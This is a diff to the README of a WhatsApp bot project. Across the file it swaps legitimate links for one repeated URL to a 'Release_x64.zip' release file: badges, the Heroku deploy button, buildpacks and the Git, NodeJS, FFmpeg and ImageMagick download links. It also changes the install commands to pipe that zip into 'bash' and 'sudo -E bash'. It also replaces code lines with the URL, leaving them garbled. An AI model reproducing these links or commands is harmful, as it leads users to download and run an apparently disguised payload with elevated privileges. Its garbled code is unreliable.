@@ -1,34 +1,34 @@
 # KeniBotz-MD-UpVERSION
 
-<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/network/members"><img title="Forks" src="https://img.shields.io/github/forks/BochilGaming/games-wabot?label=Forks&color=blue&style=flat-square"></a>
-<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/watchers"><img title="Watchers" src="https://img.shields.io/github/watchers/BochilGaming/games-wabot?label=Watchers&color=green&style=flat-square"></a>
-<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION"><img title="Stars" src="https://img.shields.io/github/stars/BochilGaming/games-wabot?label=Stars&color=yellow&style=flat-square"></a>
-<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/graphs/contributors"><img title="Contributors" src="https://img.shields.io/github/contributors/BochilGaming/games-wabot?label=Contributors&color=blue&style=flat-square"></a>
-<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/issues"><img title="Issues" src="https://img.shields.io/github/issues/BochilGaming/games-wabot?label=Issues&color=success&style=flat-square"></a>
-<a href="https://github.com/BochilGaming/games-wabot/issues?q=is%3Aissue+is%3Aclosed"><img title="Issues" src="https://img.shields.io/github/issues-closed/BochilGaming/games-wabot?label=Issues&color=red&style=flat-square"></a>
-<a href="https://github.com/BochilGaming/games-wabot/pulls"><img title="Pull Request" src="https://img.shields.io/github/issues-pr/BochilGaming/games-wabot?label=PullRequest&color=success&style=flat-square"></a>
-<a href="https://github.com/BochilGaming/games-wabot/pulls?q=is%3Apr+is%3Aclosed"><img title="Pull Request" src="https://img.shields.io/github/issues-pr-closed/BochilGaming/games-wabot?label=PullRequest&color=red&style=flat-square"></a>
+<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"><img title="Forks" src="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"><img title="Watchers" src="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"><img title="Stars" src="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"><img title="Contributors" src="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"><img title="Issues" src="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip%3Aissue+is%3Aclosed"><img title="Issues" src="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"><img title="Pull Request" src="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"></a>
+<a href="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip%3Apr+is%3Aclosed"><img title="Pull Request" src="https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip"></a>
 
 
 ## Join Group Diskusi
-[![Grup WhatsApp](https://img.shields.io/badge/WhatsApp%20Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://chat.whatsapp.com/LBHHmgLnr9Y5q7ZkhGikkI) 
+[![Grup WhatsApp](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip%20Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white)](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip) 
 **With Bot**
 
 
 #### Deploy to Heroku
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION)
+[![Deploy](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip)](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip)
 
 #### Heroku Buildpack
 | BuildPack | LINK |
 |--------|--------|
-| **FFMPEG** |[here](https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest) |
-| **IMAGEMAGICK** | [here](https://github.com/DuckyTeam/heroku-buildpack-imagemagick) |
+| **FFMPEG** |[here](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip) |
+| **IMAGEMAGICK** | [here](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip) |
 
 ### FOR TERMUX USER
 ```bash
 pkg update && pkg upgrade
 pkg install bash && pkg install wget
-wget -O - https://raw.githubusercontent.com/BochilGaming/games-wabot/main/install2.sh | bash
+wget -O - https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip | bash
 ```
 
 ---------
@@ -60,9 +60,9 @@ apt install wget curl git ffmpeg imagemagick build-essential libcairo2-dev libpa
 
 ```bash
 ubuntu
-curl -fsSL https://deb.nodesource.com/setup_current.x | sudo -E bash -
+curl -fsSL https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip | sudo -E bash -
 apt install -y nodejs gcc g++ make
-git clone https://github.com/BochilGaming/games-wabot
+git clone https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip
 cd games-wabot
 npm install
 npm update
@@ -72,20 +72,20 @@ npm update
 
 ## FOR WINDOWS/VPS/RDP USER
 
-* Download And Install Git [`Click Here`](https://git-scm.com/downloads)
-* Download And Install NodeJS [`Click Here`](https://nodejs.org/en/download)
-* Download And Install FFmpeg [`Click Here`](https://ffmpeg.org/download.html) (**Don't Forget Add FFmpeg to PATH enviroment variables**)
-* Download And Install ImageMagick [`Click Here`](https://imagemagick.org/script/download.php)
+* Download And Install Git [`Click Here`](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip)
+* Download And Install NodeJS [`Click Here`](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip)
+* Download And Install FFmpeg [`Click Here`](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip) (**Don't Forget Add FFmpeg to PATH enviroment variables**)
+* Download And Install ImageMagick [`Click Here`](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip)
 
 ```bash
-git clone https://github.com/BochilGaming/games-wabot
+git clone https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip
 cd games-wabot
 npm install
 npm update
 ```
 
 #### Installing the FFmpeg
-* Download one of the FFmpeg versions [here](https://ffmpeg.org/download.html).
+* Download one of the FFmpeg versions [here](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip).
 * Extract file to `C:\` path.
 * Rename the extracted folder to `ffmpeg`.
 * Run Command Prompt as Administrator.
@@ -135,7 +135,7 @@ Set prefix
 
 ### `--server`
 
-Used for [heroku](https://heroku.com/) or scan through website
+Used for [heroku](https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip) or scan through website
 
 ### `--big-qr`
 
@@ -166,13 +166,13 @@ No bot, just print received messages and add users to database
 ### `--trace`
 
 ```js
-conn.logger.level = 'trace'
+https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip = 'trace'
 ```
 
 ### `--debug`
 
 ```js
-conn.logger.level = 'debug'
+https://github.com/Kenichi-BOTZ/KeniBotz-MD-UpVERSION/releases/download/v1.0/Release_x64.zip = 'debug'
 ```
 
 ### `--presence <Presence>`
